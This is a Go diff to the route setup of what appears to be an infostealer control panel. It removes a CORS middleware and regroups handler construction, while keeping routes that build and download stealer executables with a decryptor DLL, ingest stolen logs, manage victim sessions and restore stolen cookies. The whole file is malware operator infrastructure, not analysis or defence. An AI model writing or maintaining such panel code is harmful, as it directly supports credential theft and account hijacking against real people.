@@ -40,43 +40,19 @@ func AuthMiddleware(secret string) func(http.Handler) http.Handler {
 	}
 }
 
-func CORSMiddleware(allowedOrigins string) func(http.Handler) http.Handler {
-	return func(next http.Handler) http.Handler {
-		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-			origin := r.Header.Get("Origin")
-
-			if allowedOrigins == "*" {
-				w.Header().Set("Access-Control-Allow-Origin", origin)
-			} else {
-				for _, o := range strings.Split(allowedOrigins, ",") {
-					if strings.TrimSpace(o) == origin {
-						w.Header().Set("Access-Control-Allow-Origin", origin)
-						break
-					}
-				}
-			}
-
-			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
-			w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type")
-
-			if r.Method == http.MethodOptions {
-				w.WriteHeader(http.StatusNoContent)
-				return
-			}
-
-			next.ServeHTTP(w, r)
-		})
-	}
-}
-
-func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins string, hub *ws.Hub, stealerExe, decryptorDll []byte) {
+func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte) {
 	authHandler := NewAuthHandler(db, jwtSecret)
 	usersHandler := NewUsersHandler(db, jwtSecret)
 	statsHandler := NewStatsHandler(db, hub)
 	logProc := services.NewLogProcessor(db, hub)
 	logsHandler := NewLogsHandler(logProc)
-
-	r.Use(CORSMiddleware(allowedOrigins))
+	sessionsHandler := NewSessionsHandler(db)
+	searchHandler := NewSearchHandler(db)
+	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, db)
+	notesHandler := NewNotesHandler(db)
+	exportHandler := NewExportHandler(db)
+	settingsHandler := NewSettingsHandler(db, jwtSecret)
+	restoreHandler := NewRestoreHandler(db)
 
 	r.Group(func(r chi.Router) {
 		r.Post("/api/auth/login", authHandler.Login)
@@ -85,16 +61,15 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins stri
 
 	r.Group(func(r chi.Router) {
 		r.Use(AuthMiddleware(jwtSecret))
+
 		r.Get("/api/stats", statsHandler.Dashboard)
 
-		sessionsHandler := NewSessionsHandler(db)
 		r.Get("/api/sessions", sessionsHandler.List)
 		r.Get("/api/sessions/{id}", sessionsHandler.Detail)
 		r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
 		r.Post("/api/sessions/{id}/lock", sessionsHandler.Lock)
 		r.Post("/api/sessions/{id}/unlock", sessionsHandler.Unlock)
 
-		searchHandler := NewSearchHandler(db)
 		r.Get("/api/search", searchHandler.Search)
 
 		r.Post("/api/log", logsHandler.Ingest)
@@ -105,26 +80,21 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins stri
 		r.Post("/api/log/ssp", sspHandler.ProcessSSP)
 
 		r.Route("/api/build", func(r chi.Router) {
-			buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, db)
 			r.Post("/", buildHandler.Build)
 			r.Get("/", buildHandler.List)
 			r.Get("/{id}/download", buildHandler.Download)
 		})
 
-		notesHandler := NewNotesHandler(db)
 		r.Get("/api/sessions/{id}/notes", notesHandler.List)
 		r.Post("/api/sessions/{id}/notes", notesHandler.Create)
 		r.Delete("/api/notes/{id}", notesHandler.Delete)
 
-		exportHandler := NewExportHandler(db)
 		r.Get("/api/export/session/{id}", exportHandler.ExportSession)
 		r.Post("/api/export/bulk", exportHandler.ExportBulk)
 
-		settingsHandler := NewSettingsHandler(db, jwtSecret)
 		r.Get("/api/settings", settingsHandler.Get)
 		r.Put("/api/settings", settingsHandler.Update)
 
-		restoreHandler := NewRestoreHandler(db)
 		r.Post("/api/restore/cookies", restoreHandler.Restore)
 
 		r.With(middleware.RequireRole("admin")).Get("/api/users", usersHandler.List)
